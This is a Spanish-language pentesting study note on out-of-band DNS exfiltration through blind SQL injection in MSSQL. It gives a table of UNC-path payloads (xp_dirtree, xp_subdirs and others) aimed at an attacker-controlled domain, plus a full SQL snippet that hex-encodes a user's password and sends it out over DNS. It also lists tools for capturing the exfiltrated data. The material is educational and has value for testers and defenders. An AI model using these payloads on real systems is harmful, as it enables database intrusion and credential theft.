---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Explotacion
Descripción: "La extracción boolean y time-based son lentas: miles de peticiones para una sola tabla"
Fecha de actualización: 2026-06-04
Nota previa: "[[08 - Extracción de datos time-based]]"
Nota siguiente: "[[10 - MSSQL ejecución de comandos con xp_cmdshell]]"
Area: "[[SQLi Blind.base|SQLi Blind]]"
---
---

La extracción [[05 - Optimización de la extracción|boolean]] y [[08 - Extracción de datos time-based|time-based]] son lentas: miles de peticiones para una sola tabla. La exfiltración **out-of-band (OOB)** invierte el enfoque: <mark style="background: #ADCCFFA6;">en lugar de leer la respuesta, se obliga al servidor a enviar el dato a un canal externo que controlamos —típicamente una petición DNS—</mark>. En el caso ideal, exfiltra un dato entero en **una sola petición**.

# El concepto

Si controlamos `evil.com` y forzamos al servidor objetivo a resolver `736563726574.evil.com`, al mirar los logs DNS vemos el subdominio `736563726574` = `secret` en hex. <mark style="background: #FFB86CA6;">El dato viaja como subdominio de nuestro dominio</mark>. OOB es especialmente valiosa cuando la time-based es demasiado lenta, imprecisa o imposible (consulta síncrona sin retardo observable).

> [!important]+
> <mark style="background: #8000E1A6;">Incluir OOB en la metodología es clave</mark>: hay inyecciones ciegas que **solo** se detectan así. Si una consulta no devuelve nada, no provoca error y se ejecuta de forma síncrona (sin afectar al tiempo de respuesta), boolean y time fallan —pero una petición DNS saliente la delata—.

# Funciones MSSQL que disparan DNS

Cada una requiere permisos distintos (no todas funcionan siempre). `SELECT 1234` es el marcador del dato a exfiltrar; `YOUR.DOMAIN`, el dominio controlado:

| Función | Uso |
| ------- | --- |
| `xp_dirtree` | `EXEC('master..xp_dirtree "\\'+@T+'.YOUR.DOMAIN\x"')` |
| `xp_subdirs` | `EXEC('master..xp_subdirs "\\'+@T+'.YOUR.DOMAIN\x"')` |
| `xp_fileexist` | `EXEC('master..xp_fileexist "\\'+@T+'.YOUR.DOMAIN\x"')` |
| `fn_trace_gettable` | `SELECT * FROM fn_trace_gettable('\\'+@T+'.YOUR.DOMAIN\x.trc',DEFAULT)` |
| `fn_get_audit_file` | `SELECT * FROM fn_get_audit_file('\\'+@T+'.YOUR.DOMAIN\',DEFAULT,DEFAULT)` |

La técnica usa una ruta UNC (`\\host\share`): MSSQL intenta resolver el host por DNS, llevándose nuestro dato como subdominio.

# Limitaciones DNS y codificación

Los nombres de dominio solo admiten letras, números y guiones; cada *label* (entre puntos) máximo 63 caracteres, el dominio completo máximo 253. <mark style="background: #FFB8EBA6;">Por eso el dato se codifica (hex/base64) y se parte en varios labels o varias peticiones</mark>. El patrón MSSQL para convertir a hex y partir en dos trozos de 63:

```sql
DECLARE @T VARCHAR(MAX); DECLARE @A VARCHAR(63); DECLARE @B VARCHAR(63);
SELECT @T=CONVERT(VARCHAR(MAX), CONVERT(VARBINARY(MAX), password), 1) FROM users WHERE username='maria';
SELECT @A=SUBSTRING(@T,3,63); SELECT @B=SUBSTRING(@T,3+63,63);
EXEC('master..xp_subdirs "\\'+@A+'.'+@B+'.YOUR.DOMAIN\x"');
```

> [!warning]+
> Dos condiciones de fiabilidad: la consulta exfiltrada debe devolver **un solo resultado** (si no, concaténalos con `STRING_AGG` —en MSSQL; `GROUP_CONCAT` es de MySQL— o el atacante recibe varias peticiones mezcladas), y el dato debe **codificarse** (el `CONVERT(...,1)` produce hex con prefijo `0x`, de ahí el `SUBSTRING(...,3,...)` que lo salta).

# Herramientas para capturar el DNS

- **`interactsh`** ([projectdiscovery](https://github.com/projectdiscovery/interactsh)): la opción moderna. Da un dominio `*.oast.fun`/`*.oast.online` y registra las interacciones DNS/HTTP, vía web (`app.interactsh.com`) o CLI (`interactsh-client`). Estándar de facto en bug bounty.
- **Burp Collaborator** (Burp Pro): cliente OOB integrado. No admite `@A.@B.dominio` (multi-label), así que se envían dos peticiones separadas.
- **Servidor DNS propio**: registrando una zona (un `A` record wildcard `@` apuntando a la máquina atacante) se capturan las peticiones en los logs del propio DNS —imprescindible en redes internas sin salida a Internet—.

> [!info]+
> <mark style="background: #FF5582A6;">OOB DNS no es exclusiva de SQLi</mark>: es la misma técnica que destapa el [[05 - XPath ciega y basada en tiempo|blind XPath]], el blind XXE y la blind command injection. Dominar el canal DNS sirve para toda una familia de vulnerabilidades ciegas. La limitación: el servidor objetivo debe poder hacer DNS saliente, cada vez más filtrado en entornos endurecidos.

Más allá de leer datos, si la cuenta tiene privilegios de `sysadmin`, MSSQL permite el salto definitivo —ejecutar comandos del sistema—: [[10 - MSSQL ejecución de comandos con xp_cmdshell]].
